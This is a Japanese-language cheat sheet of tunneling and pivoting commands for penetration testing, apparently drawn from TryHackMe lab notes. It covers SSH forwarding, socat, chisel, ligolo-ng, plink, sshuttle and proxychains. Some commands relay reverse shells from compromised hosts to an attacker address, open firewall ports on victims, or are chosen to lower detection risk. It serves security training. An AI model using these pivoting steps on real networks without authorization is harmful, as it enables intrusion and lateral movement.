# トンネリング

## 準備

```shell
# kali上にトンネル専用のユーザー作成、パスワード設定
sudo useradd -m -s /usr/sbin/nologin tunnel
sudo passwd tunnel
sudo nano /etc/ssh/sshd_config
```

ポートフォワード専用設定

```text
Match User tunnel
    PermitOpen any
    ForceCommand echo 'This account can only be used for port forwarding'
    AllowTcpForwarding yes
    X11Forwarding no
    PermitTTY no
```

```shell
# SSH リスタート
sudo systemctl restart ssh
```

### 後始末

```shell
sudo userdel tunnel
```

## ターゲットのローカル Web サーバーに接続

kali からターゲットに SSH 接続でき、ターゲット上のローカル稼働している Web サーバーにアクセスするケース。  
バックグラウンドにするには -fN オプション。

```shell
ssh -L 80:localhost:80 <user>@<target-ip>
```

### 動的転送

ブラウザのプロキシ設定で localhost,1337 を設定することにより、内部ネットワークIPを指定して直接接続することも可能。

```sh
ssh <user>@<target-ip> -i ./id_rsa -D 1337
```

## RDP ポート転送

kali からはターゲットの RDP にアクセスできないが、侵害済の PC からはアクセスでき、かつ侵害済 PC から kali への SSH 接続ができるケース。

```shell
# 侵害済のPCで実行。<kali-port>:<target-ip>:<target-port>
ssh tunneluser@<kali-ip> -R 3389:<target-ip>:3389 -N
```

kali 上でローカルに向けて RDP 接続すると、ターゲットに転送される

```shell
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

同様に、このようにすると HTTP トンネルになる

```shell
ssh -R 8080:172.20.0.120:80 user@IP1
```

```shell
# kali上から target上の7777ポートにアクセス
# -N : コマンド実行なしでポートフォワードのみ行う
ssh -N -R 6666:localhost:7777 tunnel@10.2.22.182
```

## ローカルポート転送

ターゲットから kali に接続できないが、kali 上のサービスに接続させたいケース。

```shell
# 侵害済のPCで実行
ssh tunneluser@<kali-ip> -L *:80:127.0.0.1:80 -N

# FWルール変更（要管理者）
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

ターゲットから次のように kali のサービスに接続できる

```text
http://<侵害済PCのIP>:80
```

## 複合トンネリング

```shell
ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

- kali のローカル 8888 に HTTP リクエストすると、thmdc.za.tryhackme.com:80 に転送される
- 侵害済 PC の 6666 ポートでのリッスンは、kali の 6666 ポートに転送される
- 侵害済 PC の 7878 ポートでのリッスンは、kali の 7878 ポートに転送される

metasploit のエクスプロイトを想定。Web サーバーに HTTP リクエスト、Web サーバーからペイロードのリクエスト、Web サーバーからリバースシェルの接続。

## socat

`fork,reuseaddr` を使用したら複数の接続を作成できる。

### RDP 転送

```shell
# kali 上ではなく、侵害済 PC 上にポートを開く
socat TCP4-LISTEN:3389,fork TCP4:<target-ip>:3389

# FWルールが必要
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

### HTTP 転送

```shell
socat TCP4-LISTEN:80,fork TCP4:<kali-ip>:80
```

### SSH

```sh
# kali
socat TCP-LISTEN:2222,fork TCP:<TARGET-IP>:2222

# target FORWARD-IP は localhostなど
socat TCP-LISTEN:2222,fork TCP:<FORWARD-IP>:22
```

### リバースシェルリレー

kaliの443でリッスンしているとする。侵害マシンの8000ポートへの接続をkaliに転送。

```sh
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```

### ターゲットでリッスンしない方法

検出リスクを減らす目的。  
kaliのlocal:8000から、ターゲットの指定ポートに接続する例。

kali

```sh
# 8001ポートに入力されたデータは8000ポートにローカル転送される
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

踏み台

```sh
# kaliの8001とターゲットの指定ポートをリンク
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

### OPENSSL

デフォルトでクライアント側で検証はされないが暗号化はされる。  
MITMのリスクを無視できるケースでは、通信内容が復号される心配はないので十分。

```sh
# クライアント側は証明書不要
socat STDIN OPENSSL:<>:1337
```

```sh
# Listen側は自己証明が必要
openssl req -x509 -newkey rsa:2048 \
  -keyout key.pem \
  -out cert.pem \
  -days 365 -nodes

socat OPENSSL-LISTEN:1337,cert=cert.pem,key=key.pem,fork TCP:127.0.0.1:80
```

## 動的ポート転送

プロキシチェーンを使って、任意のコマンドでポート転送する。nmap 等は正しく動作しない可能性がある。

```shell
# 侵害済PC
ssh tunneluser@1.1.1.1 -R 9050 -N

# kali側
proxychains curl http://pxeboot.za.tryhackme.com
```

/etc/proxychains4.conf で指定されているポートと一致させる必要がある

```text
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

## nc

FW で 25 ポートは通らないが、443 ポートは通る場合

```shell
sudo nc -lvnp 443 -c "nc <target-ip> 25"
```

## Firefox

標準の HTTP ポート以外はエラーになってしまうので、ポート制限を解除する

```
about:config
network.security.ports.banned.override
# string
1-9999
```

## ligolo-ng

https://github.com/nicocha30/ligolo-ng/releases

agent, proxy の 2 つをダウンロードする。

kali でプロキシ起動

```sh
# ネットワークインターフェイスを作成する場合は sudo が必要
sudo ./proxy -selfcert
```

pivot でエージェント起動、プロキシに接続

```sh
./agent -ignore-cert -connect <PROXY_SERVER_ADDR>:11601 &
```

プロキシでトンネル開始

```sh
ifcreate --name ligolo

tunnel_start

# CIDRを確認
ifconfig

# ルート追加（CIDR指定）
add_route --name ligolo --route 172.16.5.0/24

del_route --name ligolo --route 172.16.5.0/24
```

agent で listen、その agent に 別の agent が connect のようにすることで、ダブル、トリプルのトンネリングも可能。

https://olivierkonate.medium.com/pivoting-made-easy-with-ligolo-ng-17a4a8a539df

## proxychains

```sh
# 設定ファイルの優先順位。一時的な設定ならカレントディレクトリを使えばよい
./proxychains.conf
~/.proxychains/proxychains.conf
/etc/proxychains.conf

# 環境によって少しファイル名が異なる
nano /etc/proxychain.conf

socks5 127.0.0.1 1337

# nmap を使う場合、proxy_dns はコメントアウトする
proxy_dns
```

```sh
# ダイナミックポート転送。踏み台の認証情報を使って攻撃マシンで実行
ssh <name>@<ip> -i id_rsa -D 1337
```

```sh
proxychains nmap -sT <内部ネットワークIP>
```

## chisel

https://github.com/jpillora/chisel  
https://github.com/jpillora/chisel/releases

### リバースSOCKSプロキシ

target1 を介して、target2上のSSHに接続する例。

kali

```sh
./chisel server -p LISTEN_PORT --reverse &
```

target1

```sh
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

kali上にデフォルト1080ポートでプロキシが作られる。

proxychains で指定することによりトンネリングが可能になる。

```sh
socks5 127.0.0.1 1080
```

### フォワードSOCKSプロキシ

kali

```sh
./chisel server -p LISTEN_PORT --reverse &
```

target

```sh
# kali側の LOCAL_PORTポートが開く。
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

つまりkali側で下記のような形で接続する。

```sh
ssh user@127.0.0.1 -p LOCAL_PORT
```

### ローカルポートフォワード

target

```sh
./chisel server -p LISTEN_PORT
```

kali

```sh
# kali側の LOCAL_PORTが開く
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

## plink.exe

https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

Windows 環境で ssh コマンドとほぼ同じ感覚で使える。

```sh
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

キーを使う場合は、puttygen が必要。パスワード入力の場合は不要。

```sh
sudo apt install putty-tools
puttygen KEYFILE -o OUTPUT_KEY.ppk
```

## sshuttle

https://github.com/sshuttle/sshuttle

ligolo-ng のように直接サブネットアドレス指定で接続できるようになる。

- ターゲットにSSH接続できる必要がある
- ターゲットにPythonが必要
- ターゲットはLinuxのみ

```sh
sudo apt install sshuttle
```

構文

```sh
sshuttle -r username@address subnet 

# 例
sshuttle -r user@172.16.0.5 172.16.0.0/24
```

```sh
# 侵害されたサーバー自身のルーティングテーブルに基づいて
# サブネットを自動的に決定しようとする
sshuttle -r username@address -N
```

```sh
# キーによる接続が必要な場合
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
```

```sh
# -x オプションで侵害マシンをサブネットから除外する
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```

除外しないと、下記エラーが出る場合がある。

```sh
client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255
```

## firewalld

CentOSは、IPTablesファイアウォールを常時接続する「firewalld」というラッパーを使用している。デフォルトでは、このファイアウォールは非常に制限が厳しく、SSHとシステム管理者が指定したアクセスのみを許可する。

```sh
# ポートを開く
firewall-cmd --zone=public --add-port <port>/tcp
```
